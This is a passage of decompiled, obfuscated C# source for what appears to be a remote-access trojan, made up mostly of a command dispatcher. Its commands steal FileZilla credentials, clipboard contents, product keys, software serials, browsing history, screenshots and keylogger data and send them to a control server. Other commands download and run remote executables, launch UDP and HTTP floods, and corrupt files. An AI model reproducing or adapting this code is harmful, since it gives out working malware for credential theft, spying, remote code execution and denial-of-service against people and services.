							psisazbhsxxljkrsbr = FindWindowExA(mnnbscdpmfv5, 0, ref lpstrReturnString, ref kmmzgmosrkjbcr);
							nfpobvsmuecdu((int)psisazbhsxxljkrsbr, 1);
						}
						if (Operators.CompareString(array[1], "hidenotify", false) == 0)
						{
							bzmruvwszphtb = (long)hnbpkivcyzskz("shell_traywnd", null);
							int mnnbscdpmfv6 = (int)bzmruvwszphtb;
							string lpstrReturnString = "TrayNotifyWnd";
							string kmmzgmosrkjbcr = null;
							psisazbhsxxljkrsbr = FindWindowExA(mnnbscdpmfv6, 0, ref lpstrReturnString, ref kmmzgmosrkjbcr);
							nfpobvsmuecdu((int)psisazbhsxxljkrsbr, 0);
						}
						if (Operators.CompareString(array[1], "emptyrecbin", false) == 0)
						{
							ispraznismece();
						}
						if (Operators.CompareString(array[1], "openwebsite", false) == 0)
						{
							Process.Start(array[2]);
						}
						if (Operators.CompareString(array[1], "closeprogramthis", false) == 0)
						{
							string text2 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", "ProcessorNameString", (object)null));
							try
							{
								WebClient webClient = new WebClient();
								string text3 = default(string);
								NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(site, (object)("users.php?action=delete&data=" + Environment.UserName)), (object)"|"), (object)((ServerComputer)MyProject.Computer).get_Info().get_OSFullName()), (object)"|"), (object)lgtpjnspeljzonvv), (object)"|"), (object)RegionInfo.CurrentRegion.DisplayName), (object)"|"), (object)(text2 + "|")), (object)text3) }, (string[])null, (Type[])null, (bool[])null, true);
								ProjectData.EndApp();
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							ProjectData.EndApp();
						}
						if (Operators.CompareString(array[1], "focusdesktop", false) == 0)
						{
							keybd_event(91, 0, 0, 0);
							keybd_event(77, 0, 0, 0);
							keybd_event(91, 0, 2, 0);
						}
						if (Operators.CompareString(array[1], "mutesound", false) == 0)
						{
							SendMessageW(((Control)this).get_Handle(), 793, ((Control)this).get_Handle(), (IntPtr)524288);
						}
						if (Operators.CompareString(array[1], "suspendprocess", false) == 0)
						{
							try
							{
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[1], "hidetaskbar", false) == 0)
						{
							SetWindowPos(tfcwipwwkmfd, 0, 0, 0, 0, 0, 128);
						}
						if (Operators.CompareString(array[1], "showtaskbar", false) == 0)
						{
							SetWindowPos(tfcwipwwkmfd, 0, 0, 0, 0, 0, 64);
						}
						if (Operators.CompareString(array[1], "startchat", false) == 0)
						{
							mynick = array[2];
							cevwtmzeasddae = "yes";
						}
						if (Operators.CompareString(array[1], "stopchat", false) == 0)
						{
							cevwtmzeasddae = "no";
						}
						if (Operators.CompareString(array[1], "changenick", false) == 0)
						{
							mynick = array[2];
						}
						IntPtr gjztuexigkblladxan = hnbpkivcyzskz("ProgMan", null);
						gjztuexigkblladxan = pfkhyoyvhwua(gjztuexigkblladxan, 5u);
						if (Operators.CompareString(array[1], "showicons", false) == 0)
						{
							nfpobvsmuecdu(gjztuexigkblladxan, 4);
						}
						if (Operators.CompareString(array[1], "hideicons", false) == 0)
						{
							nfpobvsmuecdu(gjztuexigkblladxan, 0);
						}
						if (Operators.CompareString(array[1], "changeprocesstitle", false) == 0)
						{
							Process[] processesByName2 = Process.GetProcessesByName("notepad.exe");
							Process[] array2 = processesByName2;
							int num = default(int);
							foreach (Process process2 in array2)
							{
								num = Conversions.ToInteger(process2.ProcessName);
							}
							int mnnbscdpmfv7 = num;
							string lpstrReturnString = "HAHAHA";
							SetWindowTextA(mnnbscdpmfv7, ref lpstrReturnString);
						}
						if (Operators.CompareString(array[1], "blockusbwrite", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", "WriteProtect", (object)"00000001", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "unblockusbwrite", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", "WriteProtect", (object)"00000000", RegistryValueKind.DWord);
						}
						string path = "C:\\Program Files\\Steam\\ClientRegistry.blob";
						if (File.Exists(path))
						{
							File.Delete(path);
						}
						if (Operators.CompareString(array[1], "settime", false) == 0)
						{
							try
							{
								DateAndTime.set_TimeOfDay(Conversions.ToDate(array[2] + ":" + array[3] + ":" + array[4]));
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[1], "getclipboard", false) == 0)
						{
							WebClient webClient2 = new WebClient();
							NewLateBinding.LateCall((object)webClient2, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)Clipboard.GetText()) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "getfilezilla", false) == 0)
						{
							rtb1.LoadFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml", (RichTextBoxStreamType)1);
							RichTextBox val = rtb1;
							val.set_Text(val.get_Text() + "FileZilla Stealer by -Black Hacker-\r\n------------------------------------\r\n");
							string[] lines = ((TextBoxBase)rtb1).get_Lines();
							foreach (string text4 in lines)
							{
								if (text4.Contains("<Host>"))
								{
									val = rtb2;
									val.set_Text(val.get_Text() + "Host: " + text4.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", ""));
								}
								if (text4.Contains("<Port>"))
								{
									val = rtb2;
									val.set_Text(val.get_Text() + ":" + text4.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + "\r\n");
								}
								if (text4.Contains("<User>"))
								{
									val = rtb2;
									val.set_Text(val.get_Text() + "Korisnik:: " + text4.Replace("<User>", "").Replace("</User>", "").Replace("            ", ""));
								}
								if (text4.Contains("<Pass>"))
								{
									val = rtb2;
									val.set_Text(val.get_Text() + " Lozinka: " + text4.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + "\r\n------------------------------------\r\n");
								}
							}
							WebClient webClient3 = new WebClient();
							NewLateBinding.LateCall((object)webClient3, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)rtb2.get_Text()) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "printdocument", false) == 0)
						{
							Random random = new Random();
							string text5 = Interaction.Environ("tmp") + "\\" + Conversions.ToString(random.Next()) + ".txt";
							StreamWriter streamWriter2 = new StreamWriter(text5);
							streamWriter2.Write(array[2]);
							streamWriter2.Close();
							Interaction.Shell("notepad /p " + text5, (AppWinStyle)2, false, -1);
						}
						if (Operators.CompareString(array[1], "lockclipboard", false) == 0)
						{
							clipb.set_Enabled(true);
						}
						if (Operators.CompareString(array[1], "clipboardoff", false) == 0)
						{
							clipb.set_Enabled(false);
						}
						if (Operators.CompareString(array[1], "funnycapslockon", false) == 0)
						{
							CAPS.set_Enabled(true);
						}
						if (Operators.CompareString(array[1], "funnycapslockoff", false) == 0)
						{
							CAPS.set_Enabled(false);
						}
						if (Operators.CompareString(array[1], "swapmouse1", false) == 0)
						{
							SwapMouseButton(0L);
						}
						if (Operators.CompareString(array[1], "swapmouse2", false) == 0)
						{
							SwapMouseButton(256L);
						}
						if (Operators.CompareString(array[1], "fakemessage", false) == 0)
						{
							if (Operators.CompareString(array[3], "1", false) == 0)
							{
								Interaction.MsgBox((object)array[2], (MsgBoxStyle)64, (object)array[4]);
							}
							if (Operators.CompareString(array[3], "2", false) == 0)
							{
								Interaction.MsgBox((object)array[2], (MsgBoxStyle)48, (object)array[4]);
							}
							if (Operators.CompareString(array[3], "3", false) == 0)
							{
								Interaction.MsgBox((object)array[2], (MsgBoxStyle)32, (object)array[4]);
							}
							if (Operators.CompareString(array[3], "4", false) == 0)
							{
								Interaction.MsgBox((object)array[2], (MsgBoxStyle)16, (object)array[4]);
							}
						}
						if (Operators.CompareString(array[1], "saytext", false) == 0)
						{
							object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("sapi.spvoice", ""));
							object[] array3 = new object[1];
							object[] array4 = array3;
							string[] array5 = array;
							string[] array6 = array5;
							int num2 = 2;
							array4[0] = array6[2];
							object[] array7 = array3;
							object[] array8 = array7;
							bool[] array9 = new bool[1] { true };
							NewLateBinding.LateCall(objectValue, (Type)null, "Speak", array8, (string[])null, (Type[])null, array9, true);
							if (array9[0])
							{
								array5[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
							}
						}
						if (Operators.CompareString(array[1], "disableshowhiden", false) == 0)
						{
							string text6 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
							((ServerComputer)MyProject.Computer).get_Registry().SetValue(text6, "Hidden", (object)"0", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "enableshowhiden", false) == 0)
						{
							string text7 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
							((ServerComputer)MyProject.Computer).get_Registry().SetValue(text7, "Hidden", (object)"1", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "getsampserverdata", false) == 0)
						{
							string text8 = "";
							Process[] processesByName3 = Process.GetProcessesByName("samp-server");
							foreach (Process process3 in processesByName3)
							{
								string fileName = process3.MainModule!.FileName;
								fileName = fileName.ToString().Replace("samp-server.exe", string.Empty);
								StreamReader streamReader = new StreamReader(fileName + "server.cfg");
								string text9 = streamReader.ReadToEnd();
								streamReader.Close();
								text8 = text9;
							}
							WebClient webClient4 = new WebClient();
							NewLateBinding.LateCall((object)webClient4, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)text8) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "getwindowswallpaperpath", false) == 0)
						{
							RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: false);
							string text10 = registryKey.GetValue("WallPaper")!.ToString();
							registryKey.Close();
							WebClient webClient5 = new WebClient();
							NewLateBinding.LateCall((object)webClient5, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)text10) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "down2load", false) == 0)
						{
							tklpjlpudgdtoc(Conversions.ToString(Operators.ConcatenateObject(site, (object)"files/transfer/upload.php")), array[2]);
						}
						if (Operators.CompareString(array[1], "d2fi2runit", false) == 0)
						{
							Random random2 = new Random();
							string text11 = Conversions.ToString(random2.Next());
							((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[2], Interaction.Environ("tmp") + "/" + text11 + ".exe");
							if (Operators.CompareString(array[3], "1", false) == 0)
							{
								if (Operators.CompareString(array[4], "1", false) == 0)
								{
									Interaction.Shell(Interaction.Environ("tmp") + "/" + text11 + ".exe", (AppWinStyle)0, false, -1);
								}
								else
								{
									Interaction.Shell(Interaction.Environ("tmp") + "/" + text11 + ".exe", (AppWinStyle)1, false, -1);
								}
							}
							tklpjlpudgdtoc(Conversions.ToString(Operators.ConcatenateObject(site, (object)"files/transfer/upload.php")), array[2]);
						}
						if (Operators.CompareString(array[1], "setstartbuttontext", false) == 0)
						{
							SetStartCaption(array[2]);
						}
						if (Operators.CompareString(array[1], "coruptfile", false) == 0)
						{
							Corrupt(array[2], "lolHAHAHAHHAHAHAHAHAhackedbygpyouaredoomd!");
						}
						if (Operators.CompareString(array[1], "defaultbrowser", false) == 0)
						{
							WebClient webClient6 = new WebClient();
							NewLateBinding.LateCall((object)webClient6, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)otuplgtgusmhxgkdm()) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "getcamstasialicence", false) == 0)
						{
							string text12 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\6.0", "RegisteredTo", (object)null));
							string text13 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\6.0", "RegistrationKey", (object)null));
							string text14 = "User: " + text12 + "\r\nSerial: " + text13;
							WebClient webClient7 = new WebClient();
							NewLateBinding.LateCall((object)webClient7, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)text14) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "postscreenshot", false) == 0)
						{
							Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
							Bitmap val2 = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
							Graphics val3 = Graphics.FromImage((Image)(object)val2);
							val3.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
							new PictureBox();
							((Image)val2).Save(Interaction.Environ("tmp") + "/image.jpg");
							tklpjlpudgdtoc(Conversions.ToString(Operators.ConcatenateObject(site, (object)"files/image/desktop/upload.php")), Interaction.Environ("tmp") + "/image.jpg");
						}
						if (Operators.CompareString(array[1], "instaledsoft", false) == 0)
						{
							RichTextBox val4 = new RichTextBox();
							val4.set_Text(hbjxaatniojs());
							WebClient webClient8 = new WebClient();
							NewLateBinding.LateCall((object)webClient8, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"other/installed/data.php?action=write&data="), (object)val4.get_Text()) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "startsaver", false) == 0)
						{
							StartScreenSaver(nwnzifphhpmlljt: true);
						}
						if (Operators.CompareString(array[1], "stopsaver", false) == 0)
						{
							StartScreenSaver(nwnzifphhpmlljt: false);
						}
						if (Operators.CompareString(array[1], "leftmouse", false) == 0)
						{
							mouse_event(MouseEventFlags.LeftDown, 0, 0, 0, 0);
							mouse_event(MouseEventFlags.LeftUp, 0, 0, 0, 0);
						}
						if (Operators.CompareString(array[1], "midlemouse", false) == 0)
						{
							mouse_event(MouseEventFlags.MiddleDown, 0, 0, 0, 0);
							mouse_event(MouseEventFlags.MiddleUp, 0, 0, 0, 0);
						}
						if (Operators.CompareString(array[1], "rightmouse", false) == 0)
						{
							mouse_event(MouseEventFlags.RightDown, 0, 0, 0, 0);
							mouse_event(MouseEventFlags.RightUp, 0, 0, 0, 0);
						}
						if (Operators.CompareString(array[1], "last25sites", false) == 0)
						{
							string name = "Software\\Microsoft\\Internet Explorer\\TypedURLs";
							RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name);
							string text15 = null;
							int num3 = 1;
							while (true)
							{
								string name2 = "url" + num3;
								string text16 = (string)registryKey2.GetValue(name2);
								if (text16 == null)
								{
									break;
								}
								text15 = text15 + "\r\n" + text16;
								num3++;
							}
							WebClient webClient9 = new WebClient();
							NewLateBinding.LateCall((object)webClient9, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)text15) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "writeprocesses", false) == 0)
						{
							string text17 = "";
							Process[] processes = Process.GetProcesses();
							foreach (Process process4 in processes)
							{
								text17 = process4.ProcessName + "|" + Conversions.ToString(process4.Id) + "|" + Conversions.ToString(process4.SessionId) + "|" + process4.MainWindowTitle + "\r\n" + text17;
							}
							WebClient webClient10 = new WebClient();
							NewLateBinding.LateCall((object)webClient10, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(site, (object)"other/process/data.php?action=write&data="), (object)text17) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "reloadkeylogger", false) == 0)
						{
							WebClient webClient11 = new WebClient();
							NewLateBinding.LateCall((object)webClient11, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(site, (object)"other/keylogger/data.php?action=write&data="), (object)gpmnyrnbxpgh.hoskfmlwnvheraydesae) }, (string[])null, (Type[])null, (bool[])null, true);
							gpmnyrnbxpgh.hoskfmlwnvheraydesae = "";
						}
						if (Operators.CompareString(array[1], "flip2screen", false) == 0)
						{
							lotnmpkxgxpvturw eeseabisxwjpuw = NativeMethods.bdbslnacziavpj();
							aoejvdbfumlibusif(ref eeseabisxwjpuw);
							eeseabisxwjpuw.jjnwulvhwmxabt = 2;
							ChangeSettings(eeseabisxwjpuw);
						}
						if (Operators.CompareString(array[1], "flipnoscreen", false) == 0)
						{
							lotnmpkxgxpvturw eeseabisxwjpuw2 = NativeMethods.bdbslnacziavpj();
							aoejvdbfumlibusif(ref eeseabisxwjpuw2);
							eeseabisxwjpuw2.jjnwulvhwmxabt = 0;
							ChangeSettings(eeseabisxwjpuw2);
						}
						if (Operators.CompareString(array[1], "changewallpaper", false) == 0)
						{
							yotkbeaxnp(array[2]);
						}
						if (Operators.CompareString(array[1], "2responsestart", false) == 0)
						{
							WebClient webClient12 = new WebClient();
							NewLateBinding.LateCall((object)webClient12, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(site, (object)"other/response/data.php?action=write&data="), (object)Environment.UserName) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "clearcookies", false) == 0)
						{
							Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2", (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array[1], "clearhistory", false) == 0)
						{
							Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1", (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array[1], "clearformdata", false) == 0)
						{
							Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16", (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array[1], "cleartempdata", false) == 0)
						{
							Interaction.Shell("RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8 ", (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array[1], "rename", false) == 0)
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(array[2]);
							if (directoryInfo.get_Exists())
							{
								directoryInfo.MoveTo(array[3]);
							}
							FileInfo fileInfo2 = new FileInfo(array[2]);
							if (fileInfo2.get_Exists())
							{
								FileInfo fileInfo3 = new FileInfo(array[2]);
								fileInfo3.MoveTo(array[3]);
							}
						}
						if (Operators.CompareString(array[1], "changeresolution", false) == 0)
						{
							changeRes(Conversions.ToInteger(array[2]), Conversions.ToInteger(array[3]));
						}
						if (Operators.CompareString(array[1], "startudpflood", false) == 0)
						{
							try
							{
								int num4 = Conversions.ToInteger(array[4]);
								int num5 = num4;
								for (int n = 0; n <= num5; n++)
								{
									UdpClient udpClient = new UdpClient();
									byte[] array10 = new byte[0];
									IPAddress addr = IPAddress.Parse(array[2]);
									udpClient.Connect(addr, Conversions.ToInteger(array[3]));
									array10 = Encoding.ASCII.GetBytes("VUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmwDyLccyzJgOrHntNVLqlmkpaTaFfRhknfFhMwrgBrivGpocOpMYmUlXbCpnhzwToOTQbetPQZjeIXqKdYNsCDBGqjqVihxCEvVkcNuwRtyMXrFseGcbDkCosSsExQNjGeWSeuKfTczuYaHagodJSTRWtzIlyxOSUMlBsdLNiLPdZIWuvWfrUnSqJiJUOgPmWgmiuLahjsQLoqXdwFuaVVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmwDyLccyzJgOrHntNVLqlmkpaTaFfRhknfFhMwrgBrivGpocOpMYmUlXbCpnhzwToOTQbetPQZjeIXqKdYNsCDBGqjqVihxCEvVkcNuwRtyMXrFseGcbDkCosSsExQNjGeWSeuKfTczuYaHagodJSTRWtzIlyxOSUMlBsdLNiLPdZIWuvWfrUnSqJiJUOgPmWgmiuLahjsQLoqXdwFuaVVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmwDyLccyzJgOrHntNVLqlmkpaTaFfRhknfFhMwrgBrivGpocOpMYmUlXbCpnhzwToOTQbetPQZjeIXqKdYNsCDBGqjqVihxCEvVkcNuwRtyMXrFseGcbDkCosSsExQNjGeWSeuKfTczuYaHagodJSTRWtzIlyxOSUMlBsdLNiLPdZIWuvWfrUnSqJiJUOgPmWgmiuLahjsQLoqXdwFuaVVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDmwDyLccyzJgOrHntNVLqlmkpaTaFfRhknfFhMwrgBrivGpocOpMYmUlXbCpnhzwToOTQbetPQZjeIXqKdYNsCDBGqjqVihxCEvVkcNuwRtyMXrFseGcbDkCosSsExQNjGeWSeuKfTczuYaHagodJSTRWtzIlyxOSUMlBsdLNiLPdZIWuvWfrUnSqJiJUOgPmWgmiuLahjsQLoqXdwFuaVVUZKRYoPOeUXPnRvtbQkbSfpYYMMmvIkEjHZlZWRigDm");
									udpClient.Send(array10, 20000);
								}
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[1], "starthttpflood", false) == 0)
						{
							sitetoflood = array[2];
							TimerFly.Elapsed += HttpFlood;
							TimerFly.Interval = Convert.ToInt32(array[3]);
							TimerFly.Start();
						}
						if (Operators.CompareString(array[1], "stophttpflood", false) == 0)
						{
							TimerFly.Stop();
						}
						if (Operators.CompareString(array[1], "startping", false) == 0)
						{
							Interaction.Shell("ping.exe -l " + array[3] + " -n " + array[3] + " " + array[2], (AppWinStyle)0, false, -1);
						}
						if (Operators.CompareString(array[1], "getwindowsproductkey", false) == 0)
						{
							string text18 = wbahlsamuabexwp("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId");
							WebClient webClient13 = new WebClient();
							NewLateBinding.LateCall((object)webClient13, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)text18) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "f2i2f", false) == 0)
						{
							WebClient webClient14 = new WebClient();
							NewLateBinding.LateCall((object)webClient14, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"other/fif/data.php?action=write&data="), rfmujicask(array[2])) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "getchromedata", false) == 0)
						{
							WebClient webClient15 = new WebClient();
							NewLateBinding.LateCall((object)webClient15, (Type)null, "DownloadString", new object[1] { Operators.AddObject(site, (object)"data.php?action=write&data=") }, (string[])null, (Type[])null, (bool[])null, true);
							return result;
						}
						return result;
					}
					return result;
				}
				return result;
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				omxybmpwzhxntrj();
			});
			thread.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void draw_Tick(object sender, EventArgs e)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		try
		{
			Graphics val = Graphics.FromHdc(GetDC(IntPtr.Zero));
			val.DrawString(wayjhryczkvgmesz, new Font("arial", 25f), Brushes.get_Red(), Conversions.ToSingle(Conversions.ToString(Conversion.Int(VBMath.Rnd() * (float)((Computer)MyProject.Computer).get_Screen().get_Bounds().Width))), Conversions.ToSingle(Conversions.ToString(Conversion.Int(VBMath.Rnd() * (float)((Computer)MyProject.Computer).get_Screen().get_Bounds().Height))));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void clipb_Tick(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetDataObject((object)"", true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CAPS_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Control.IsKeyLocked((Keys)20))
			{
				keybd_event(20, 69, 20, 0);
				keybd_event(20, 69, 22, 0);
			}
			else
			{
				keybd_event(20, 69, 20, 0);
				keybd_event(20, 69, 22, 0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	public void HttpFlood(object sender, ElapsedEventArgs e)
	{
		Type typeFromHandle = typeof(Dns);
		object[] array = new object[1] { RuntimeHelpers.GetObjectValue(sitetoflood) };
		bool[] array2 = new bool[1] { true };
		object obj = NewLateBinding.LateGet((object)null, typeFromHandle, "GetHostEntry", array, (string[])null, (Type[])null, array2);
		if (array2[0])
		{
			sitetoflood = RuntimeHelpers.GetObjectValue(array[0]);
		}
		IPHostEntry iPHostEntry = (IPHostEntry)obj;
		IPAddress[] addressList = iPHostEntry.AddressList;
		checked
		{
			int num = addressList.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				IPAddress address = IPAddress.Parse(addressList[i].ToString());
				IPEndPoint remoteEP = new IPEndPoint(address, 80);
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				try
				{
					socket.Connect(remoteEP);
				}
				catch (SocketException projectError)
				{
					ProjectData.SetProjectError((Exception)projectError);
					socket.Close();
					ProjectData.ClearProjectError();
					break;
				}
				try
				{
					socket.Send(Encoding.ASCII.GetBytes("GET /"));
				}
				catch (SocketException projectError2)
				{
					ProjectData.SetProjectError((Exception)projectError2);
					socket.Close();
					ProjectData.ClearProjectError();
					break;
				}
				socket.Close();
			}
		}
	}

	private void livescreenmanager_Tick(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
			Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
			new PictureBox();
			((Image)val).Save(Interaction.Environ("tmp") + "/image.jpg");
			tklpjlpudgdtoc(Conversions.ToString(Operators.ConcatenateObject(site, (object)"files/image/desktop/upload.php")), Interaction.Environ("tmp") + "/image.jpg");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void rtb2_TextChanged(object sender, EventArgs e)
	{
	}

	private void Button1_Click_1(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
